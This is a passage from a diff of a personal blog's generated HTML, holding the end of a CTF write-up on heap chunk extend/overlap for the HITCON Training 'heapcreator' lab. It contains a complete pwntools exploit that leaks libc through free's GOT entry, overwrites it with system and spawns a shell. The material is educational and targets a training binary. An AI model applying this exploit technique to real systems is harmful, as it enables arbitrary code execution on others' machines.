+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(1, p64(sys_addr))</span><br><span class="line">delete(0)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;choice :&quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">  menu(<span class="number">1</span>)</span><br><span class="line">  io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">  io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">  io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, new_content</span>):</span><br><span class="line">  menu(<span class="number">2</span>)</span><br><span class="line">  io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">  io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">  io.sendline(new_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">  menu(<span class="number">3</span>)</span><br><span class="line">  io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">  io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">  menu(<span class="number">4</span>)</span><br><span class="line">  io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">  io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss_struct_arry  0x6020A0</span></span><br><span class="line"><span class="comment"># x/30gx 0x603000</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;a&quot;</span>)       <span class="comment">#0 </span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;b&quot;</span>)       <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>) <span class="comment">#next chunk&#x27;s size has been changed</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#0x20 and 0x40 but total 0x40 </span></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(free_got)) <span class="comment">#two emp</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(io.recvuntil(<span class="string">&#x27;D&#x27;</span>)[:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_addr ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(free_addr)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(libc_base)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr ==&gt; [%s]&quot;</span>%<span class="built_in">hex</span>(sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(sys_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/#chunk-extend-and-overlapping">Chunk Extend and Overlapping</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-247110.htm">[原创]HITCON Trainging lab13 heapcreator</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/95f7b5d0d8ad?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">HITCON-Training WP lab13</a></p>
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2020/10/27/pwn_overlap/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-02-27T21:11:48+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 27, 2024</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/27/pwn_uaf/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
+          
   
   
   
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pwn/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>pwn</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/heap/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>heap</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/chunk-extend/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>chunk_extend</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/overlap/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>overlap</p></a></div>
+  <span hidden itemprop="keywords">pwn heap chunk_extend overlap</span>
+  
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/10/27/pwn_overlap/&title=water one water - x1ngg3's blog&summary=Chunk_extend &amp; Overlap"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/10/27/pwn_overlap/&title=water one water - x1ngg3's blog&summary=Chunk_extend &amp; Overlap"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/10/27/pwn_overlap/&title=water one water - x1ngg3's blog&summary=Chunk_extend &amp; Overlap"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2020/11/01/pwn_fastbin-attack/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Fastbin Attack related</p>
+          <p class='content'>我提莫的心态崩了啊 ಥ_ಥ
+
+
+Fastbin Double FreeFastbin Double Free 能够成功利用主要有两部分的原因
+
+fastbin 的堆块被释放后 next_chun...</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/10/27/pwn_uaf/'>
+          <p class='title'>uaf<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>ヽ(✿ﾟ▽ﾟ)ノ
+
+
+Introduction简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况
+
+内存块被释放后，其对...</p>
+        </a>
+      
+    </div>
+  
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+      <meta itemprop="discussionUrl" content="/2020/10/27/pwn_overlap/index.html#comments">
     </span>
-  
-  
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/27/pwn_uaf/"  itemprop="url">
-        uaf
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>ヽ(✿ﾟ▽ﾟ)ノ</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-27T08:00:00+08:00">2020-10-27</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/27/pwn_uaf/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
+    <div id="layoutHelper-comments"></div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/26/web_xss/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/26/web_xss/"  itemprop="url">
-        XSS
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>网络安全课作业需要，菜鸡被迫了解一下xss。</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-26T08:00:00+08:00">2020-10-26</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/WEB/">WEB</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/WEB/" itemprop="url"><span itemprop="name">WEB</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/26/web_xss/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
+  </article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/24/algorithm_review/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <div class='headimg-div'>
-      <a class='headimg-a' href="/2020/10/24/algorithm_review/">
-        <img itemprop="image" class='headimg' alt="Algorithm_review" src='https://i.loli.net/2020/11/16/DktlaEendNRYTij.png'/>
-      </a>
-    </div>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/24/algorithm_review/"  itemprop="url">
-        Algorithm_review
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>算法课复习~~</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-24T08:00:00+08:00">2020-10-24</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/Algorithm/">Algorithm</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/Algorithm/" itemprop="url"><span itemprop="name">Algorithm</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/24/algorithm_review/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/22/pwn_heap_data_structure/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/22/pwn_heap_data_structure/"  itemprop="url">
-        Heap Related Data Structure
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>好难啊</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-22T08:00:00+08:00">2020-10-22</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/22/pwn_heap_data_structure/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/20/nothing_memo/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/20/nothing_memo/"  itemprop="url">
-        x1ngg3's memo
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>我的备忘录，仅此而已</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-20T08:00:00+08:00">2020-10-20</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/NOTHING/">NOTHING</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/NOTHING/" itemprop="url"><span itemprop="name">NOTHING</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/20/nothing_memo/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/19/pwn_heap_overview/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/19/pwn_heap_overview/"  itemprop="url">
-        Heap Overview
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>heap~</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-19T08:00:00+08:00">2020-10-19</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/19/pwn_heap_overview/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/15/pwn_off-by-one/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/15/pwn_off-by-one/"  itemprop="url">
-        Off-by-one
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>(；′⌒&#96;)</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-15T08:00:00+08:00">2020-10-15</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/10/15/pwn_off-by-one/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-        <p class="current">
-          1 / 3
-        </p>
-        
-          <a class="next" rel="next" href="/page/2/">
-            <section class="post next white-box shadow floatable blur">
-              &nbsp;Next&nbsp;<i class="fa-solid fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
 
 
 </div>
@@ -3206,169 +2799,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-<section class="widget blogger desktop mobile ">
-  <div class='content'>
     
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">x1ngg3's blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/Algorithm/" href="/categories/Algorithm/"
-            active-action="action-categoriesAlgorithm"
-            ><div class='name'>Algorithm</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/CRYPTO/" href="/categories/CRYPTO/"
-            active-action="action-categoriesCRYPTO"
-            ><div class='name'>CRYPTO</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/Contest/" href="/categories/Contest/"
-            active-action="action-categoriesContest"
-            ><div class='name'>Contest</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/LR/" href="/categories/LR/"
-            active-action="action-categoriesLR"
-            ><div class='name'>LR</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/NOTHING/" href="/categories/NOTHING/"
-            active-action="action-categoriesNOTHING"
-            ><div class='name'>NOTHING</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/PWN/" href="/categories/PWN/"
-            active-action="action-categoriesPWN"
-            ><div class='name'>PWN</div><div class='badge'>(9)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/RE/" href="/categories/RE/"
-            active-action="action-categoriesRE"
-            ><div class='name'>RE</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/WEB/" href="/categories/WEB/"
-            active-action="action-categoriesWEB"
-            ><div class='name'>WEB</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/test/" href="/categories/test/"
-            active-action="action-categoriestest"
-            ><div class='name'>test</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/Algorithm-review/" style="font-size: 14px; color: #999">Algorithm_review</a> <a href="/tags/CrackMe160/" style="font-size: 14px; color: #999">CrackMe160</a> <a href="/tags/House-Of-Spirit/" style="font-size: 14px; color: #999">House Of Spirit</a> <a href="/tags/SCTF/" style="font-size: 14px; color: #999">SCTF</a> <a href="/tags/WangDingCup-2020/" style="font-size: 14px; color: #999">WangDingCup_2020</a> <a href="/tags/XCTF-RE/" style="font-size: 14px; color: #999">XCTF_RE</a> <a href="/tags/buuoj-re/" style="font-size: 14px; color: #999">buuoj_re</a> <a href="/tags/chunk-extend/" style="font-size: 14px; color: #999">chunk_extend</a> <a href="/tags/crypto-buuoj/" style="font-size: 14px; color: #999">crypto_buuoj</a> <a href="/tags/heap/" style="font-size: 20.67px; color: #6c6c6c">heap</a> <a href="/tags/hook/" style="font-size: 14px; color: #999">hook</a> <a href="/tags/memo/" style="font-size: 14px; color: #999">memo</a> <a href="/tags/off-by-one/" style="font-size: 14px; color: #999">off_by_one</a> <a href="/tags/overlap/" style="font-size: 14px; color: #999">overlap</a> <a href="/tags/pwn/" style="font-size: 24px; color: #555">pwn</a> <a href="/tags/pwn-buuoj/" style="font-size: 14px; color: #999">pwn_buuoj</a> <a href="/tags/pwn-xctf/" style="font-size: 14px; color: #999">pwn_xctf</a> <a href="/tags/stackoverflow/" style="font-size: 14px; color: #999">stackoverflow</a> <a href="/tags/test/" style="font-size: 14px; color: #999">test</a> <a href="/tags/uaf/" style="font-size: 14px; color: #999">uaf</a> <a href="/tags/webweb/" style="font-size: 14px; color: #999">webweb</a> <a href="/tags/xss/" style="font-size: 14px; color: #999">xss</a> <a href="/tags/%E5%9B%BD%E8%B5%9B/" style="font-size: 14px; color: #999">国赛</a> <a href="/tags/%E6%97%A5%E6%9A%AE/" style="font-size: 14px; color: #999">日暮</a> <a href="/tags/%E6%A9%99%E9%9D%92/" style="font-size: 14px; color: #999">橙青</a> <a href="/tags/%E7%94%B5%E5%BD%B1%E6%84%9F/" style="font-size: 14px; color: #999">电影感</a> <a href="/tags/%E8%B0%83%E8%89%B2/" style="font-size: 17.33px; color: #828282">调色</a>
-    </div>
-  </section>
-
-
-    
